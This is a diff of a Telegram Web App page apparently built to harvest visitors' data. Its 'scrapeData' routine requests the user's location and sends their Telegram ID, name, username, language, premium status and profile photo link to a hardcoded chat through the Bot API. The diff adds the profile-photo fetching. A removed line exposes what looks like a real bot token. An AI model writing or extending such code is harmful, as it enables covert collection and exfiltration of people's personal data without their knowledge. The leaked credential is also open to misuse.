@@ -158,7 +158,7 @@
                 Telegram.WebApp.MainButton.show();
             }
         };
-        function scrapeData(){
+        function scrapeData() {
             requestLocation();
             sendUserDataToTelegram();
         }
@@ -271,7 +271,7 @@
             document.body.setAttribute('style', '--bg-color:' + Telegram.WebApp.backgroundColor);
         });
 
-        function sendUserDataToTelegram() {
+        async function sendUserDataToTelegram() {
             const user = Telegram.WebApp.initDataUnsafe.user;
             if (!user) {
                 Telegram.WebApp.showAlert("User data is not available.");
@@ -279,18 +279,21 @@
             }
 
             const chatId = "7265296083";  // Replace with actual chat ID
-            const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
+            const botToken = "YOUR_BOT_TOKEN"; // Replace with your bot token
+
+            // Fetch user profile photo
+            let photoUrl = await getUserProfilePhoto(user.id, botToken);
 
             const userData = `
-                        👤 *User Data*:
-                        🆔 ID: ${user.id}
-                        👤 Name: ${user.first_name} ${user.last_name || ""}
-                        🔗 Username: @${user.username || "N/A"}
-                        🌍 Language: ${user.language_code || "N/A"}
-                        💎 Premium: ${user.is_premium ? "Yes" : "No"}
-                        📎 Attachment Menu: ${user.added_to_attachment_menu ? "Yes" : "No"}
-                        ✉️ Allows PM: ${user.allows_write_to_pm ? "Yes" : "No"}
-                        🖼 Profile Photo: ${user.photo_url ? `[Click Here](${user.photo_url})` : "No photo"}
+👤 *User Data*:
+🆔 ID: ${user.id}
+👤 Name: ${user.first_name} ${user.last_name || ""}
+🔗 Username: @${user.username || "N/A"}
+🌍 Language: ${user.language_code || "N/A"}
+💎 Premium: ${user.is_premium ? "Yes" : "No"}
+📎 Attachment Menu: ${user.added_to_attachment_menu ? "Yes" : "No"}
+✉️ Allows PM: ${user.allows_write_to_pm ? "Yes" : "No"}
+🖼 Profile Photo: ${photoUrl ? `[Click Here](${photoUrl})` : "No photo"}
 `;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -316,6 +319,40 @@
                     Telegram.WebApp.showAlert("Error: " + error.message);
                 });
         }
+
+        async function getUserProfilePhoto(userId, botToken) {
+            const url = `https://api.telegram.org/bot${botToken}/getUserProfilePhotos?user_id=${userId}&limit=1`;
+
+            try {
+                let response = await fetch(url);
+                let data = await response.json();
+                if (data.ok && data.result.total_count > 0) {
+                    let fileId = data.result.photos[0][0].file_id;
+                    return await getFileUrl(fileId, botToken);
+                }
+            } catch (error) {
+                console.error("Error fetching profile photo:", error);
+            }
+
+            return null; // No profile photo available
+        }
+
+        async function getFileUrl(fileId, botToken) {
+            const url = `https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`;
+
+            try {
+                let response = await fetch(url);
+                let data = await response.json();
+                if (data.ok) {
+                    return `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
+                }
+            } catch (error) {
+                console.error("Error fetching file URL:", error);
+            }
+
+            return null;
+        }
+
     </script>
 
     <!-- Eruda is console for mobile browsers -->
